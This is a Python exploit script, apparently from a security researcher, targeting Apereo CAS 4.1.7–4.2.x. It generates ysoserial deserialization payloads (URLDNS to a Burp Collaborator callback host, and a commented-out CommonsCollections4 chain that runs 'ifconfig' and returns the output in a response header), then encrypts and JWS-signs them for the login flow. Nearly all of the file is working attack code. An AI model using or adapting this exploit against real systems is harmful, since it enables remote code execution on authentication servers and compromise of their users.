# -*- encoding: utf-8 -*-
'''
@File    :   cas2.py
@Time    :   2020/07/31 19:21:34
@Author  :   cl0und 
@Version :   1.0
@Contact :   cl0und@syclover
'''

# attack cas 4.1.7-4.2.x
from jose import jws
from Crypto.Cipher import AES
from cStringIO import StringIO
import requests
import base64
import zlib
import uuid
import numpy as np
import binascii
import json
import subprocess

#In versions 4.1.7-4.2.x, keys and signatures are not hard-coded and need to be provided by the attacker.
key = ""
jws_key = ""
JAR_FILE = 'ysoserial-cas-all.jar'

def base64Padding(data):
    missing_padding = 4 - len(data) % 4
    if missing_padding and missing_padding != 4:
        data += '=' * missing_padding
    return data

def ase_encode(payload):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, mode, iv)
    file_body = pad(payload)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64Padding(base64_ciphertext)

def aes_decode(base64_plain):
    payload = base64.b64decode(base64_plain)
    mode =  AES.MODE_CBC
    iv   = payload[0:16]
    cipher = payload[16:]
    encryptor = AES.new(key, mode, IV=iv)
    payload = encryptor.decrypt(cipher)
    return payload

def decode(data):
    jwt_payload = base64.b64decode(data).split(".")[1]
    jwt_payload = jwt_payload + "=" if len(jwt_payload) % 4 != 0 else jwt_payload
    payload = base64.b64decode(jwt_payload)
    data = aes_decode(payload)
    return zlib.decompress(data, zlib.MAX_WBITS|16)

def encode(data):
    gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16)
    data = gzip_compress.compress(data) + gzip_compress.flush()
    payload = ase_encode(data)
    jws_data = jws.sign(payload, jws_key, algorithm='HS512')
    return base64Padding(base64.b64encode(jws_data))
    

if __name__ == '__main__':
    command = "http://7ems4dlurj6j09iuvnpe1bpqhhn7bw.burpcollaborator.net"
    popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'URLDNS', command],stdout=subprocess.PIPE)

    # command = '''code:org.springframework.webflow.context.ExternalContext externalContext = org.springframework.webflow.context.ExternalContextHolder.getExternalContext();
    # org.apache.catalina.connector.ResponseFacade responseFacade = (org.apache.catalina.connector.ResponseFacade) externalContext.getNativeResponse();
    # java.io.InputStream in = Runtime.getRuntime().exec("ifconfig").getInputStream();java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
    # byte[] b = new byte[1024];int a = -1;
    # while ((a = in.read(b)) != -1) {baos.write(b, 0, a);}
    # responseFacade.setHeader("Syclover",new String(b));'''

    #popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'CommonsCollections4', command],stdout=subprocess.PIPE)
    
    payload = encode(popen.stdout.read())
    print(payload)